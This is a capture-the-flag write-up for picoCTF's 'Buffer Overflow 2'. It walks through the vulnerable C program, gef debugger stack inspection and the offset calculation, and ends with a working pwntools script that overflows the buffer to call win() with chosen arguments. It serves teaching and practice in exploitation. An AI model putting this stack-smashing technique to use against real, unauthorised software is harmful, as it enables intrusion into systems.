# picoCTF - Buffer Overflow 2

## Description
Control the return address and arguments This time you'll need to control the arguments to the function you return to!

As always, let's take a look at the code first:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
Here we must do something simmilar to the past challenge, but in this case, there are 2 arguments that we need to pass to the function 'win'. `arg1=0xCAFEF00D` and `arg2=0xF00DF00D`
So, let's first see the size of our input to overflow the stack buffer and overwrite the return address. Then we'll make the program return to 'win' with the specified arguments.

Let's set the breakpoint after the input reading, and see how the stack is at that point.
```
gef➤  b *vuln+34
Breakpoint 1 at 0x804935a
gef➤  r
Starting program: /home/mfumega/Documents/challenges/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:
AAAABBBB

Breakpoint 1, 0x0804935a in vuln ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────── registers ───
$eax   : 0xffffce1c  →  "AAAABBBB"
$ebx   : 0x0804c000  →  0x0804bf10  →  0x00000001
$ecx   : 0xf7fa19c0  →  0x00000000
$edx   : 0x1
$esp   : 0xffffce00  →  0xffffce1c  →  "AAAABBBB"
$ebp   : 0xffffce88  →  0xffffcea8  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
$esi   : 0xffffcf74  →  0xffffd14d  →  "/home/mfumega/Documents/challenges/vuln"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x0804935a  →  <vuln+0022> add esp, 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce00│+0x0000: 0xffffce1c  →  "AAAABBBB"    ← $esp
0xffffce04│+0x0004: 0x0000001a
0xffffce08│+0x0008: 0xf7fa0da0  →  0xfbad2887
0xffffce0c│+0x000c: 0x08049348  →  <vuln+0010> add ebx, 0x2cb8
0xffffce10│+0x0010: 0xf7fa0da0  →  0xfbad2887
0xffffce14│+0x0014: 0xf7fa0de7  →  0xfa19b40a
0xffffce18│+0x0018: 0x00000001
0xffffce1c│+0x001c: "AAAABBBB"
─────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ───
    0x8049351 <vuln+0019>      lea    eax, [ebp-0x6c]
    0x8049354 <vuln+001c>      push   eax
    0x8049355 <vuln+001d>      call   0x80490f0 <gets@plt>
 →  0x804935a <vuln+0022>      add    esp, 0x10
```
And here in the stack, we can see the input 'AAAABBBB' and we can see the return address pointing to main '0x080493dd'.

```
gef➤  x/50wx $esp
0xffffce00:     0xffffce1c      0x0000001a      0xf7fa0da0      0x08049348
0xffffce10:     0xf7fa0da0      0xf7fa0de7      0x00000001      0x41414141
0xffffce20:     0x42424242      0x00000000      0xf7df549d      0xf7f9ea60
0xffffce30:     0xf7fa0da0      0xf7fa0000      0xffffce78      0xf7de942b
0xffffce40:     0xf7fa0da0      0x0000000a      0x0000001a      0xf7e55801
0xffffce50:     0xf7d83e54      0x000007d4      0xf7fa0e3c      0x0000001a
0xffffce60:     0xffffcea8      0xf7fd9004      0x00000000      0x0804c000
0xffffce70:     0xffffcf74      0xf7ffcb80      0xffffcea8      0x080493d5
0xffffce80:     0x0804a063      0x0804c000      0xffffcea8      0x080493dd
0xffffce90:     0xffffced0      0xf7fbe66c      0xf7fbeb10      0x000003e8
0xffffcea0:     0xffffcec0      0xf7fa0000      0xf7ffd020      0xf7d97519
0xffffceb0:     0xffffd14d      0x00000070      0xf7ffd000      0xf7d97519
0xffffcec0:     0x00000001      0xffffcf74
gef➤
```

By calculating the offset as before, we know that our input should be 112 bytes until the return address. So if we input 112 'A' and 4 letters 'B', the program will attempt to jump to 0x42424242.

Let's replace that 4 'B' with the actual address of 'win'.
```
gef➤  print win
$1 = {<text variable, no debug info>} 0x8049296 <win>
gef➤
```
And now, we must call the win function, and pass the arguments we mentioned before. To do that, we'll just send the two arguments right aftet we jump to the function.

First let's run the program in debug mode with `p = gdb.debug(binary_path)`, so we can know where the actual values that 'arg1' and 'arg2' are, and their values.

These 2 are the lines that compare the arguments against the values we saw before:
```
 →  0x804930c <win+0076>       cmp    DWORD PTR [ebp+0x8], 0xcafef00d
    0x8049315 <win+007f>       cmp    DWORD PTR [ebp+0xc], 0xf00df00d
```

And we can check the values at [ebp+0x8] and [ebp+0xc], and they are: 
```
(remote) gef➤  x/x $ebp+0x8
0xffed3404:     0xf7faf66c
(remote) gef➤  x/x $ebp+0xc
0xffed3408:     0xf7fafb10
(remote) gef➤
```

We saw the values `0xf7faf66c` for arg1, and `0xf7fafb10` for arg2. We can use the same stack dump from before, and we'll find this 2 values starting at 0xffffce94 and 0xffffce98. 
So, we know that 4 bytes after the return address, are stored arg1 and arg2. 

Now we can build out final exploit with the complete payload like this:

```
#!/usr/bin/env python3
from pwn import *

#context.arch = 'amd64'
binary_path = '/tmp/here/vuln'
p = process(binary_path)
#p = gdb.debug(binary_path)
offset = 112

payload = b'A' * offset
payload += p32(0x8049296)
payload += b'A' * 4
payload += p32(0xcafef00d)
payload += p32(0xf00df00d)

p.sendline(payload)
response = p.recvall()
print(response.decode('latin-1'))
```

That's it for this challenge! If we do this against the remote connection, we'll get the flag! 


